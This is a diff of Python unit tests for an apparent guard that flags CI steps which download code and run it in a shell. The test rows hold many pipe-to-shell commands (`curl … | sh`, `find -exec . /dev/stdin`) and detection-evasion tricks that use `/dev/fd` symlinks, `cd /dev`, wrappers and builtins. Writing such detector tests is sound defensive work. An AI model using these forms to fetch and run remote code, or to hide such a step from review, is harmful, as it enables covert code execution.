+            tree = ast.parse(path.read_text(encoding="utf-8"))
+            owner = {}
+            for function in ast.walk(tree):
+                if isinstance(function, (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda)):
+                    for node in ast.walk(function):
+                        owner.setdefault(id(node), []).append(getattr(function, "name", "<lambda>"))
+            called = set()
+            for node in ast.walk(tree):
+                if isinstance(node, ast.Call):
+                    finds += [(path.stem, owner.get(id(node), ["<module>"])[-1]) for word in node.keywords if word.arg == "finds"]
+                    function = node.func
+                    if isinstance(function, ast.Name) and function.id == "producer":
+                        chain.append((path.stem, owner.get(id(node), ["<module>"])[-1]))
+                    if (isinstance(function, ast.Attribute) and function.attr == "acted"
+                            and isinstance(function.value, ast.Name) and function.value.id == "shell_reader"):
+                        calls.append((path.stem, owner.get(id(node), ["<module>"])[-1]))
+                        called.add(id(function))
+            for node in ast.walk(tree):
+                named = (isinstance(node, ast.Name) and node.id == "acted"
+                         or isinstance(node, ast.Attribute) and node.attr == "acted" and id(node) not in called
+                         or isinstance(node, ast.alias) and "acted" in (node.name, node.asname)
+                         or isinstance(node, ast.FunctionDef) and node.name == "acted"
+                         or isinstance(node, ast.arg) and node.arg == "acted"
+                         or isinstance(node, ast.keyword) and node.arg == "acted"
+                         or isinstance(node, ast.Constant) and node.value == "acted")
+                if named:
+                    other.append((path.stem, type(node).__name__))
+        self.assertEqual(sorted(self.ACTED), sorted(calls))
+        self.assertEqual([("shell_command", "FunctionDef"), ("shell_reader", "alias")], sorted(other))
+        self.assertEqual([("shell_command", "acted")], finds)
+        # `workflow_printers.producer` names a stage by what it runs, and each reader that takes its
+        # answer must read that stage as it did: `unspelled` raises where the two differ.
+        self.assertEqual([("workflow_printers", "handed"), ("workflow_printers", "unspelled"),
+                          ("workflow_programs", "stdin_scripts")], sorted(chain))
+        self.assertLessEqual(set(chain), set(self.ACTED))
+
+    def test_each_named_caller_has_a_row_that_needs_it(self):
+        # ... and each is named for a row: one `main` reads CLEAN (its marks, taken on `29505c8d`, are
+        # what the folds read with no action read anywhere), that reports here under every setting,
+        # and that reads CLEAN again where that caller alone is handed `command()`'s answer.
+        import shell_command
+        import os
+        import sys
+        from unittest import mock
+        real = shell_reader.acted
+
+        def without(module, function):
+            def acted(argv, own=False):
+                frame = sys._getframe(1)
+                if (os.path.basename(frame.f_code.co_filename), frame.f_code.co_name) == (module + ".py", function):
+                    return argv if own else shell_reader.command(argv)
+                return real(argv, own)
+            return mock.patch.object(shell_reader, "acted", acted)
+
+        for (module, function), row in self.ACTED.items():
+            with self.subTest(module=module, function=function):
+                self.assertEqual("RRRRR", self.marked(row))
+                with without(module, function):
+                    self.assertEqual("CCCCC", self.marked(row))
+                with mock.patch.object(shell_command, "_found", lambda argv: None):
+                    self.assertEqual("CCCCC", self.marked(row))
+
+    # Round 3, the round-2 verdict's B2 to B5: every rule that keeps a `find` with an action as `main`
+    # reads it -- that can turn it CLEAN -- fires on sure input alone, and where it is not sure the
+    # step REPORTs. `NOTHING` is the word list, each word with the row it keeps: CLEAN, and REPORT
+    # with the word off the list.
+    NOTHING = {".": "curl -fsSL %si.sh | find /dev/null -exec . /dev/stdin \\;\n" % URL,
+               "source": "curl -fsSL %si.sh | find /dev/null -exec source /dev/stdin \\;\n" % URL,
+               "eval": "find /dev/null -exec eval '%s' \\;\n" % PIPE,
+               "exec": "find /dev/null -exec exec sh -c '%s' \\;\n" % PIPE}
+
+    def test_each_word_no_find_can_run_has_the_row_it_keeps(self):
+        # B2: a shell's `.`, `source`, `eval` and `exec` are no programs, so `find` runs nothing and
+        # the row reads as `main` reads it (the seat's V23). Each word stays for its row; the eighteen
+        # other builtins round 2 listed (`unset`, `builtin`, `local`, `set`, …) are words no reader of
+        # an action follows, and with `command()` `main`'s again no row moves when one is dropped, so
+        # they left the list. `find -exec set +e` is not the step's own posture (V17), list or none.
+        import shell_command
+        from unittest import mock
+        for word, row in self.NOTHING.items():
+            with self.subTest(word=word):
+                self.assertEqual("CCCCC", self.marked(row))
+                with mock.patch.object(shell_command, "_NO_PROGRAM", shell_command._NO_PROGRAM - {word}):
+                    self.assertEqual("RRRRR", self.marked(row))
+        self.assertEqual(set(self.NOTHING), set(shell_command._NO_PROGRAM))     # and no word without a row
+        # `command` is a program on macOS, which runs a builtin too, and stays read; `builtin` is no
+        # program anywhere, and no reader follows the word (both as round 2 read them).
+        self.assertEqual("RRRRR", self.marked("find /dev/null -exec command sh -c '%s' \\;\n" % PIPE))
+        self.assertEqual("CCCCC", self.marked("find /dev/null -exec builtin eval '%s' \\;\n" % PIPE))
+        self.assertEqual("CCCRR", self.marks("find /dev/null -exec set +e \\;\n" + self.CHECK))
+        self.assertEqual("RRRRR", self.marks("set +e\nfind /dev/null -exec set -e \\;\n" + self.CHECK))
+        # What a `find` hands a download to is read as `main` reads it, whatever the action's word (V20, V21).
+        for use in ("exec sh tool", ". ./tool"):
+            self.assertTrue(reported(GET + "find /dev/null -exec %s \\;\n" % use))
+
+    def test_a_builtins_name_is_no_program_only_where_find_looks_it_up(self):
+        # B3: the rule is sure for the action's own first word, written as a bare name -- the one
+        # word `find` looks up. Behind a wrapper that hands its words to a shell (`sudo -s`, `-i`,
+        # `--shell`, `--login`, `doas -s`: sudo 1.9.15p5 passes the command "to the shell as a simple
+        # command using the -c option"), behind any other wrapper, or behind a path (`command` is a
+        # program on macOS, which runs the builtin of its name), it is not, and the action is read:
+        # REPORT, as round 1 read it. Round 2 kept the `find` behind `sudo` too (the seat's 31 rows).
+        for word, row in self.NOTHING.items():
+            for front in ("sudo -s ", "sudo -i ", "sudo --shell ", "sudo --login ", "doas -s ", "sudo ", "env ", "nohup ",
+                          "command ", "/usr/bin/command ", "/usr/bin/", "./"):
+                with self.subTest(word=word, front=front):
+                    self.assertEqual("RRRRR", self.marked(row.replace("-exec " + word, "-exec " + front + word)))
+
+    def test_an_assignment_is_no_program_where_it_names_no_path(self):
+        # `find` looks an assignment up as a program's name, and none is named `X=1`: nothing runs
+        # (CLEAN, as on `main`). One that holds a `/` is a path, which may be a program (round 3), and
+        # one behind `env` or `sudo` is that wrapper's own: both are read.
+        for action, marks in (("X=1 sh -c '%s'", "CCCCC"), ("X= sh -c '%s'", "CCCCC"), ("X+=1 sh -c '%s'", "CCCCC"),
+                              ("X=a/b sh -c '%s'", "RRRRR"), ("X=/usr/bin/env sh -c '%s'", "RRRRR"),
+                              ("env X=1 sh -c '%s'", "RRRRR"), ("sudo X=1 sh -c '%s'", "RRRRR"), ("sh -c '%s'", "RRRRR")):
+            with self.subTest(action=action):
+                self.assertEqual(marks, self.marked("find /dev/null -exec %s \\;\n" % (action % PIPE)))
+
+    def test_an_action_is_read_as_a_command_of_its_own(self):
+        # A `$` word bash may drop in front of a known name, and a shell's default, read in an action
+        # as they read where the step runs them (`main` dropped the one and read the other): round 1
+        # read each as a word behind a wrapper, which reported benign finds (the seat's R15, R16, R18;
+        # 780 of its 785 benign cells). With a download each still reports (R13, R14), and #2918's
+        # reasons stand: a `$` command word, and one behind a wrapper the action runs (R02, R06, R17).
+        for action in ("$SUDO sh -c 'echo hi'", "${SUDO} sh -c 'echo hi'", "${SH:-sh} -c 'echo hi'", "${X:+env} sh -c 'echo hi'"):
+            for shell in SHELLS:
+                with self.subTest(action=action, shell=shell):
+                    self.assertFalse(reported("find /dev/null -exec %s \\;\n" % action, shell))
+                    self.assertTrue(reported("find /dev/null -exec %s \\;\n" % action.replace("echo hi", PIPE), shell))
+        self.assertFalse(reported("find . -name '*.sh' -exec ${SUDO:-} bash -n {} \\;\n"))
+        # A word that begins with a whole reference is the step's own kind too, read by its basename
+        # as `main` reads it (round 3): `$SUDO/usr/bin/env sh -c '…'` is that shell's program.
+        self.assertEqual("CCCCC", self.marked("find /dev/null -exec $SUDO/usr/bin/env sh -c 'echo hi' \\;\n"))
+        self.assertEqual("RRRRR", self.marked("find /dev/null -exec $SUDO/usr/bin/env sh -c '%s' \\;\n" % PIPE))
+        for action, why in (("$X -c '%s'" % PIPE, "`find` runs `$X`"), ("sudo $X sh -c '%s'" % PIPE, "a command `find` runs"),
+                            ("$SUDO chmod +x {}", "`find` runs `$SUDO`")):
+            found = wg.job_defects([wg.Step("step", "find . -name '*.sh' -exec %s \\;\n" % action, None)])
+            self.assertIn(why, " ".join(reason for _name, reason in found))
+
+    def test_a_dollar_word_that_may_hold_a_blank_is_not_read_past(self):
+        # B5: "the `$` word is dropped, and the next word is the command" is sure only for a word
+        # that cannot hold a blank -- one that begins with a whole reference (`_OPTIONAL`), above. A
+        # default or an alternate with a blank is cut where the reader meets it, an operand of
+        # `find`'s, and what is left of it names nothing: `${X:+/usr/bin/env true} sh -c '…'` runs
+        # the shell where `X` is unset (the seat's 244 rows of W8 and HF, CLEAN at round 2's head and
+        # on `main`). The step REPORTs, benign or not -- the price, a command the guard cannot read.
+        for word in ("${X:+/usr/bin/env true}", "${X:-/usr/bin/env true}", "${X:=/usr/bin/env true}", "${X:+env -i}"):
+            for program in ("echo hi", PIPE):
+                with self.subTest(word=word, program=program):
+                    row = "find /dev/null -exec %s sh -c '%s' \\;\n" % (word, program)
+                    self.assertEqual("RRRRR", self.marked(row))
+                    found = wg.job_defects([wg.Step("step", row, None)])
+                    self.assertIn("a command word it or bash decides as it runs", " ".join(why for _name, why in found))
+
+    def test_a_find_an_action_runs_is_kept(self):
+        # `find` ends an action at the first `;` or `{} +`, so a `find` an action runs holds no action
+        # it can run: `acted()` unwraps one `find`, and the reads grow with the depth of a nest, not
+        # as a power of it (round 1: 32, 192, 768, 2,560, 8,192 and 25,600 `_found` calls at depths 1
+        # to 6; round 2: 14 a level; now 2, the named readers' alone, in the folds that read actions).
+        # Each `-exec` of the nest is still read, as an action of the first. Since #2858 the guard
+        # reads a job twice -- `main`'s pass, then the walk's -- so the calls are counted for each
+        # reading, as `TestACallSiteCarriesAFixedNumberOfTimes` counts its carries, and each reading
+        # is held to the bound the one reading had: under 200 for depths 2 and 6 together (6 and 14
+        # now; 46 and 102 at round 2). The readings are counted too, and so is the growth: the same
+        # step for two levels more.
+        import shell_command
+        import shell_wrappers
+        from unittest import mock
+
+        def nest(depth):
+            return "find /dev/null -exec " * depth + "sh -c '%s' " % PIPE + "\\; " * depth + "\n"
+        stage = shell_reader.statements(nest(3))[0].stages[0]
+        with mock.patch.dict(shell_command._ACTIONS, act=True):
+            argv = shell_reader.acted(stage.argv)
+        self.assertEqual(("find", shell_wrappers.Found, 2), (argv[0], type(argv[0]), argv.count("-exec")))
+        counted, found, readings = {}, shell_command._found, TestACallSiteCarriesAFixedNumberOfTimes.PASSES
+        passes = TestACallSiteCarriesAFixedNumberOfTimes.each_pass(counted)
+
+        def count(argv):
+            counted["calls"] = counted.get("calls", 0) + 1
+            return found(argv)
+        with mock.patch.object(shell_command, "_found", count), mock.patch.object(wg, "_job_defects", passes.entered):
+            for depth in (2, 4, 6):
+                self.assertTrue(wg.job_defects([wg.Step("step", nest(depth), None)]))
+        self.assertEqual(3 * readings, len(passes))
+        for reading in range(readings):
+            two, four, six = (passes[at * readings + reading]["calls"] for at in range(3))
+            with self.subTest(reading=reading):
+                self.assertLess(two + six, 200)
+                self.assertEqual(four - two, six - four)
+
+    def test_a_nest_a_wrapper_splits_out_of_one_word_is_not_read_past(self):
+        # B4: "a `find` an action runs holds no action it can run" is sure only for a nest written
+        # word by word, whose every `-exec` is an action of the first `find` and read as one. Where
+        # a wrapper splits the inner `find` out of ONE word (`env -S '…'`), its `;` is its own, it
+        # runs its action, and no word of the outer `find` shows it (the seat's 6 rows, 16 of 16
+        # running). The step REPORTs -- a command the guard cannot read, benign or not.
+        nested = "find /dev/null -exec %s \\;\n"
+        for inner, marks in (("find /dev/null -exec sh -c 'echo hi' \\;", "CCCCC"), ("find /dev/null -exec sh -c '%s' \\;" % PIPE, "RRRRR"),
+                             ("env -S 'find /dev/null -exec echo hi ;'", "RRRRR"),
+                             ("env -S 'find /dev/null -exec sh -c \"%s\" ;'" % PIPE, "RRRRR"),
+                             ("env --split-string='find /dev/null -exec echo hi ;'", "RRRRR"),
+                             ("env -S 'sh -c \"echo hi\"'", "CCCCC"), ("env -S 'sh -c \"%s\"'" % PIPE, "RRRRR"),
+                             ("env find /dev/null -name x", "CCCCC")):
+            with self.subTest(inner=inner):
+                self.assertEqual(marks, self.marked(nested % inner))
+        found = wg.job_defects([wg.Step("step", nested % "env -S 'find /dev/null -exec echo hi ;'", None)])
+        self.assertIn("a `find` a wrapper splits out of one word", " ".join(why for _name, why in found))
+
+    def test_the_command_of_a_find_in_a_fold_that_reads_actions(self):
+        import shell_command
+        import shell_wrappers
+        from unittest import mock
+        stage = shell_reader.statements("find /dev/null -exec env sh -c x \\;\n")[0].stages[0]
+        with mock.patch.dict(shell_command._ACTIONS, act=True):
+            argv = shell_reader.acted(stage.argv)
+            # A check keeps the `find`; so does an empty action.
+            for kept in ("find /dev/null -exec sha256sum -c sums \\;\n", "find /dev/null -exec \\;\n", "find /dev/null -exec env \\;\n"):
+                self.assertEqual("find", shell_reader.acted(shell_reader.statements(kept)[0].stages[0].argv)[0])
+        self.assertEqual((["sh", "-c", "x"], shell_wrappers.Found), (argv, type(argv[0])))
+        # A program an action runs has no sure reader.
+        self.assertEqual([None], [script.reader for script in shell_command.unsure(argv, ["x"])])
+        self.assertEqual((None, "r"), (shell_command.sure_reader(argv, "r"), shell_command.sure_reader(["sh"], "r")))
+        # The reader hands what `N<>` holds to a shell any action runs, whichever one a fold reads (#2918).
+        stage = shell_reader.statements("find /dev/null -exec true \\; -exec sh /dev/fd/3 \\; 3<> tool\n")[0].stages[0]
+        self.assertIn("tool", stage.reads)
+
+class TestAPathTheStepLinkedOrMovedToIsItsDescriptor(unittest.TestCase):
+    """#2919: a shell reads what `N<>` holds where it opens N's path (#2881), but a path the step's own
+    state makes resolve to a descriptor carried nothing -- a name it linked (`ln -s /dev/fd/3 x` then
+    `sh 3<> tool <x 3<&-`) or a relative path after its `cd` (`cd /dev` then `<fd/3`) -- while every
+    parent of the link forms, and of `cd /dev` and `cd /`, runs the file, and `main` reports the `N<`
+    twin. The reader now reads the operand where the step's links and `cd` may put it too, beside
+    where it stands as written (`shell_command.track`, `sources`): a record adds a reading and takes
+    none away (round 2)."""
+
+    def test_each_link_the_seat_and_the_hunt_name_reports(self):
+        # FL01, FL02, FL03, FL04 and FL06 (the #2885 round-4 seat; P0L01 and P0L02 are FL01's and
+        # FL03's), the hunt's `-sf` and `./` (L6), and #2885's CHANGELOG example.
+        for use in ("ln -s /dev/fd/3 x\nsh 3<> tool <x 3<&-", "ln -s /dev/fd/9 x\nsh 9<> tool 4<x 9<&- <&4",
+                    "ln -s /dev/fd fds\nsh 3<> tool <fds/3 3<&-", "ln -s /proc/self/fd p\nsh 3<> tool <p/3 3<&-",
+                    "ln -s /dev d\nsh 3<> tool <d/fd/3 3<&-", "ln -sf /dev/fd/3 x\nsh 3<> tool <./x 3<&-",
+                    "ln -s /dev/fd/3 fd3\nsh 3<> tool <fd3 3<&-"):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertTrue(reported(GET + use + "\necho done\n", shell))
+
+    def test_each_directory_a_cd_moved_to_reports(self):
+        # The hunt's C1 (`cd /dev`, #2885's CHANGELOG example) and C4 (`cd /`), which every parent runs,
+        # and C2 (`cd /dev/fd`) and C3 (`cd /proc/self`), which the dash parents run: `cd` resolves
+        # `/proc/self` there for the parent shell, not the child that holds 3.
+        get = "curl -fsSLo /tmp/tool %stool\n" % URL
+        for use in ("cd /dev\nsh 3<> /tmp/tool <fd/3 3<&-", "cd /\nsh 9<> /tmp/tool <dev/fd/9 9<&-",
+                    "cd /dev/fd\nsh 3<> /tmp/tool <3 3<&-", "cd /proc/self\nsh 3<> /tmp/tool <fd/3 3<&-"):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertTrue(reported(get + use + "\necho done\n", shell))
+
+    def test_a_name_or_a_directory_a_value_decides_carries_every_held_file(self):
+        # Fail-closed, as `<"$P"` already is: the link's name, or the `cd`'s directory, may be the one.
+        for use in ('ln -s /dev/fd/3 "$X"\nsh 3<> tool <x 3<&-', 'cd "$D"\nsh 3<> tool <fd/3 3<&-'):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertTrue(reported(GET + use + "\necho done\n", shell))
+
+    def test_a_link_or_a_cd_that_reaches_no_descriptor_carries_nothing(self):
+        # As `main` reads them: a link elsewhere, a `cd` elsewhere, and a link to a descriptor with
+        # nothing downloaded (the hunt's B1).
+        for use in (GET + "ln -s /usr/share x\nsh 3<> tool <x/y 3<&-", GET + "cd /tmp\nsh 3<> tool <fd/3 3<&-",
+                    "ln -s /dev/fd/3 x\nsh 3<> /dev/null <x 3<&-", "cd /dev\nsh -c true <null"):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertFalse(reported(use + "\necho done\n", shell))
+
+    def test_a_heredoc_or_a_pipe_a_link_reaches_is_the_shells_program(self):
+        # The input a path the step linked or moved to opens is the descriptor's, a heredoc's body or
+        # a pipe (the hunt's H1-H3, which every parent runs), beside a plain file of that name (H4).
+        body = "\ncurl -fsSL %si.sh | sh\nEOF\n" % URL
+        for use, runs in (("ln -s /dev/fd/3 x\nsh 3<<'EOF' <x" + body, True), ("cd /dev\nsh 3<<'EOF' <fd/3" + body, True),
+                          ("ln -s /dev/stdin x\ncurl -fsSL %si.sh | sh <x\n" % URL, True),
+                          ("touch x\nsh 3<<'EOF' <x" + body, False)):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertEqual(runs, reported(use + "echo done\n", shell))
+
+    def test_a_pattern_below_a_link_or_a_cd_is_read_as_main_reads_its_whole_path(self):
+        # `main` reads `</dev/fd/[3]`, a path of whichever descriptor bash's expansion picks, as every
+        # file held and any pipe. So is its twin below a `cd /dev` or a link to `/dev/fd`, which each
+        # of bash's parents runs (dash expands no pattern in a redirection): rounds 1 and 2 read no
+        # word bash expands through a record, and CLEAN (the round-2 seat's `reached-dynamic-too`,
+        # which passed its suite). Where no record puts it below `/dev/fd` it is an ordinary file.
+        get, held = "curl -fsSLo /tmp/tool %stool\n" % URL, "sh 3<> /tmp/tool <%s 3<&-\n"
+        for use in (get + held % "/dev/fd/[3]", get + "cd /dev\n" + held % "fd/[3]", get + "ln -s /dev/fd fds\n" + held % "fds/[3]",
+                    "cd /dev\nsh 3<<'EOF' <fd/[3]\n%s\nEOF\n" % PIPE, "cd /dev\n%s <fd/[0]\n" % PIPE):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertTrue(reported(use, shell))
+        for use in (get + "cd /srv\n" + held % "fd/[3]", get + held % "fd/[3]", "cd /dev\nsh 3<<'EOF' <fd/[3]\necho hi\nEOF\n"):
+            with self.subTest(use=use):
+                self.assertFalse(reported(use))
+
+    # Round 2 (the round-1 seat's B1): a record adds a reading and takes none away. Each row holds
+    # the download on fd 3 and reads fd 3's own path, which `main` reports; in front of it stands a
+    # link or a move the shell never makes, or not as the reader read it, which round 1 let rewrite
+    # the read, so it read CLEAN while every parent runs the download.
+    HELD = "sh 3<> tool <%s 3<&-"
+    DEEP = "/srv/a/b/c/d/e/f/g"         # deeper than the climb below, so no join of the two is `/dev`
+    CLIMB = "../../../../../dev/fd/3"   # `/dev/fd/3`, as `main` reads it from any directory
+
+    def test_a_link_the_shell_does_not_make_clears_nothing(self):
+        # The seat's LN rows, a class a line: the link's name is a descriptor path or a prefix of one,
+        # which `ln` cannot make (name-fd, name-prefix; hard); the `ln` never runs (a branch, `||`, a
+        # function never called, `&&`, a `case` arm); the reader takes another word for the name (`-t`,
+        # several targets, an option's value); the name is reached by a climb. And the controls.
+        read = self.HELD % "/dev/fd/3"
+        for link in ("ln -s /etc/hostname /dev/fd/3 || true", "ln -s /etc/hostname /dev/fd || true",
+                     "ln -s /etc/hostname /dev || true", "ln /etc/hostname /dev/fd/3 || true",
+                     "if false; then ln -s /etc/hostname /dev/fd/3; fi", "true || ln -s /etc/hostname /dev/fd/3",
+                     "f() { ln -s /etc/hostname /dev/fd/3; }", "[ -e /nonexistent ] && ln -s /etc/hostname /dev/fd/3",
+                     "case x in y) ln -s /etc/hostname /dev/fd/3 ;; esac", "mkdir -p d\nln -s -t d /dev/fd/3",
+                     "mkdir -p d\nln -st d /dev/fd/3", "mkdir -p d\nln -s /dev/fd/9 /dev/fd/3 d", "ln -S .bak -s /dev/fd/3 x",
+                     "echo ln -s /etc/hostname /dev/fd/3", "true"):
+            for shell in SHELLS:
+                with self.subTest(link=link, shell=shell):
+                    self.assertTrue(reported(GET + link + "\n" + read + "\necho done\n", shell))
+        climb = "ln -s /etc/hostname ../../../../../dev || true\n" + self.HELD % self.CLIMB
+        self.assertTrue(reported(GET + climb + "\necho done\n"))
+
+    def test_a_move_the_shell_does_not_make_clears_nothing(self):
+        # The seat's CM rows, a class a line: a `cd` that stays in a child -- a subshell, a pipeline
+        # stage, a function never called, a branch, a loop, a background job; one that fails, or that a
+        # wrapper runs; one undone (`popd`); and one whose real directory is not the path the reader
+        # joins -- a symlinked directory, `~user`, `HOME=…`. And the controls.
+        deep, read = self.DEEP, self.HELD % self.CLIMB
+        for move in ("(cd %s)", "(cd %s && ls > /dev/null)", "cd %s | cat", "f() { cd %s; }", "if false; then cd %s; fi",
+                     "true || cd %s", "case x in y) cd %s ;; esac", "while false; do cd %s; done", "for d in; do cd %s; done",
+                     "cd %s &\nwait", "cd /nonexistent%s || true", "cd %s extra || true", "sudo cd %s || true",
+                     "env cd %s || true", "pushd %s > /dev/null\npopd > /dev/null", "cd %s\ncd - > /dev/null", "true # %s"):
+            for shell in SHELLS:
+                with self.subTest(move=move, shell=shell):
+                    self.assertTrue(reported(GET + move % deep + "\n" + read + "\necho done\n", shell))
+        get, read = "curl -fsSLo /tmp/tool %stool\n" % URL, "sh 3<> /tmp/tool <../dev/fd/3 3<&-"
+        for move in ("cd /var/run", "cd ~sys", "HOME=/usr\ncd", "cd /usr"):
+            for shell in SHELLS:
+                with self.subTest(move=move, shell=shell):
+                    self.assertTrue(reported(get + move + "\n" + read + "\necho done\n", shell))
+
+    def test_every_link_and_every_move_recorded_is_a_reading(self):
+        # The price of knowing no `ln` or `cd` to have run: a link later written over or removed, and
+        # a directory the step has left again or entered in a subshell, still stand for a later path.
+        get = "curl -fsSLo /tmp/tool %stool\n" % URL
+        for use in ("ln -s /dev/fd/3 x\nln -sf /etc/hostname x\nsh 3<> /tmp/tool <x 3<&-",
+                    "ln -s /dev/fd/3 x\nrm x\nsh 3<> /tmp/tool <x 3<&-", "cd /dev\ncd /tmp\nsh 3<> /tmp/tool <fd/3 3<&-",
+                    "(cd /dev)\nsh 3<> /tmp/tool <fd/3 3<&-", "ln -s /dev/fd/3 x\nln -s /dev/fd/4 y\nsh 3<> /tmp/tool 4<> other <x 3<&- 4<&-"):
+            with self.subTest(use=use):
+                self.assertTrue(reported(get + use + "\necho done\n"))
+
+    def test_a_relative_target_and_a_cd_back_are_read_too(self):
+        # A link's relative target stands in the directory the link was made in (`cd /` then `ln -s
+        # dev/fd/3 x`): with no `cd` it names no descriptor. And `cd -` goes where `OLDPWD` says, a
+        # place a value decides, so every file held is carried.
+        get = "curl -fsSLo /tmp/tool %stool\n" % URL
+        for use, held in (("cd /\nln -s dev/fd/3 x\nsh 3<> /tmp/tool <x 3<&-", True),
+                          ("cd /dev\nln -s fd/3 x\nsh 3<> /tmp/tool <x 3<&-", True),
+                          ("ln -s dev/fd/3 x\nsh 3<> /tmp/tool <x 3<&-", False),
+                          ("OLDPWD=/dev\ncd -\nsh 3<> /tmp/tool <fd/3 3<&-", True)):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertEqual(held, reported(get + use + "\necho done\n", shell))
+
+    def test_a_here_strings_text_is_no_path(self):
+        # `sh <<< x` hands the shell the text `x`, not the file: a link or a `cd` adds no reading of it
+        # (round 1 read each of these as the pipe's reader; nothing runs the download). A path does.
+        pipe = "curl -fsSL %si.sh | sh " % URL
+        for use in ('cd "$D"\n' + pipe + "<<< 'echo hi'", "cd /dev\n" + pipe + "<<< stdin", "ln -s /dev/stdin x\n" + pipe + "<<< x"):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertFalse(reported(use + "\necho done\n", shell))
+        self.assertTrue(reported("ln -s /dev/stdin x\n" + pipe + "< x\necho done\n"))
+        # Nor does its text carry a file held, where a link's name is any name (the round-2 seat's
+        # `site1-herestring-guard-off`): `<<< x` hands the shell the word, `< x` the download.
+        held = GET + 'L=x\nln -s /dev/fd/3 "$L"\nsh 3<> tool %s x 3<&-\n'
+        self.assertEqual([False, True], [reported(held % op) for op in ("<<<", "<")])
+
+    def test_what_the_steps_links_and_cd_may_make_of_a_path(self):
+        import shell_command
+        import shell_tokens
+        read = shell_reader.input_alias_fd
+
+        def tracked(*lines):
+            context = shell_tokens._Parse("")
+            for text in lines:
+                shell_command.track(context, shell_reader.statements(text + "\n")[0].stages[0])
+            return context
+        # Each target a name was given is kept, the first beside the one that wrote it over.
+        links = tracked("ln -s /dev/fd/3 x", "ln -sf /dev/fd fds", "ln -s /dev", "ln -sf /etc/hostname x")
+        self.assertEqual({"x": ["/dev/fd/3", "/etc/hostname"], "fds": ["/dev/fd"], "dev": ["/dev"]}, links.links)
+        # As written first, then each other descriptor a link may give the word.
+        self.assertEqual([(None, "3"), (None, "9"), (None, "4"), (None,), ("5",)],
+                         [shell_command.sources(word, links, read) for word in ("x", "fds/9", "dev/fd/4", "/etc/x", "/dev/fd/5")])
+        # One descriptor where the paths agree on it, `?` -- every file held -- where they are two.
+        self.assertEqual(["3", "5", None], [shell_command.carrier(word, links, read) for word in ("x", "/dev/fd/5", "/etc/x")])
+        links.links["/dev/fd/5"] = ["/dev/fd/6"]
+        self.assertEqual("?", shell_command.carrier("/dev/fd/5", links, read))
+        # Each directory a `cd` named is kept, a relative one below each before it.
+        moves = tracked("cd /dev", "cd fd", "cd /tmp")
+        self.assertEqual(["/dev", "/dev/fd", "/tmp"], moves.cwds)
+        # Home, bare or by `~`, is a place of its own, joined below no other (round 3).
+        self.assertEqual(["/dev", "~", "~sys", "~/x"], tracked("cd /dev", "cd", "cd ~sys", "cd ~/x").cwds)
+        self.assertEqual([(None, "7"), (None, "3", "?"), ("5",)],
+                         [shell_command.sources(word, moves, read) for word in ("7", "fd/3", "/dev/fd/5")])
+        # The descriptor a word names as written, reached again from a place, is that one still (the
+        # round-2 seat's `sources-first-repeated`): it carries what 3 holds, not every file held.
+        self.assertEqual((("3",), "3"), (shell_command.sources("../dev/fd/3", moves, read), shell_command.carrier("../dev/fd/3", moves, read)))
+        # The places kept are the latest `_PLACES`, and a word with more paths reaches every file held.
+        many = tracked(*("cd /d%d" % n for n in range(40)))
+        self.assertEqual((shell_command._PLACES, "$PWD", "/d39"), (len(many.cwds), many.cwds[0], many.cwds[-1]))
+        self.assertEqual((None, "?"), shell_command.sources("fd/3", many, read))     # any place the step left
+        self.assertEqual((None,), shell_command.sources("fd/3", None, read))         # a here-string's text
+        many.links = {"x": ["/t%d" % n for n in range(shell_command._PLACES + 1)]}
+        self.assertEqual((None, "?"), shell_command.sources("x", many, read))
+
+    # Round 3 (the round-2 seat's B1 and B2): the body a record may put on a descriptor is one more
+    # reading beside `main`'s, read in a fold of its own (`shell_command.body_read`, `folds`), never in
+    # its place. Round 2 read it in place of what the operand names as written, so a link or a `cd`
+    # the shell never makes put a harmless body where the shell reads a pipe or a download, and the
+    # step read CLEAN while a parent runs it (the seat's 16 rows, 78 cells).
+    PRINTED = "echo '%s' | " % PIPE     # a program a printer hands down the pipe: `main` reports its reader
+    HARMLESS = " 3<<'EOF' <%s\necho hi\nEOF\n"   # a harmless body on fd 3, and the read a record says is fd 3
+
+    def test_a_body_a_record_may_add_takes_no_reading_away(self):
+        # The seat's HA and B1x rows, a class a line: the shell reads the pipe by its own path, and a
+        # link that fails (`/dev/stdin` is there), never runs (`||`, a branch, a function never
+        # called, a `case` arm) or runs in a subshell says that path is fd 3; the pipe's other
+        # paths, a climb to one too; the readers -- `bash`, `bash -s`, a `cat` that passes the pipe
+        # on -- a `printf` printer, and a here-string as the body. Each reads as `main` reads it
+        # (the seat's truth for its rows: every parent runs each, the here-string the bash ones).
+        links = ("ln -s /dev/fd/3 %s || true", "true || ln -s /dev/fd/3 %s", "if false; then ln -s /dev/fd/3 %s; fi",
+                 "f() { ln -s /dev/fd/3 %s; }", "case x in y) ln -s /dev/fd/3 %s ;; esac", "(ln -s /dev/fd/3 %s) || true")
+        rows = [link % "/dev/stdin" + "\n" + self.PRINTED + "sh" + self.HARMLESS % "/dev/stdin" for link in links]
+        rows += [links[1] % path + "\n" + self.PRINTED + "sh" + self.HARMLESS % path
+                 for path in ("/dev/fd/0", "/proc/self/fd/0", "../../../../../dev/stdin")]
+        rows += [links[1] % "/dev/stdin" + "\n" + self.PRINTED + reader + self.HARMLESS % "/dev/stdin"
+                 for reader in ("bash", "bash -s")]
+        rows += [links[1] % "/dev/stdin" + "\n" + self.PRINTED + "cat 3<<'EOF' </dev/stdin | sh\necho hi\nEOF\n",
+                 links[1] % "/dev/stdin" + "\nprintf '%s\\n' '" + PIPE + "' | sh" + self.HARMLESS % "/dev/stdin",
+                 links[1] % "/dev/stdin" + "\n" + self.PRINTED + "sh 3<<< true </dev/stdin\n"]
+        # The download itself, where a value places it (it may be the file read), and a move the shell
+        # never makes, or not for long (the seat's B1x10, B1c01 and B1c02).
+        rows += [links[1] % "x" + "\ncurl -fsSLo \"$D/x\" %stool\nsh" % URL + self.HARMLESS % "x"]
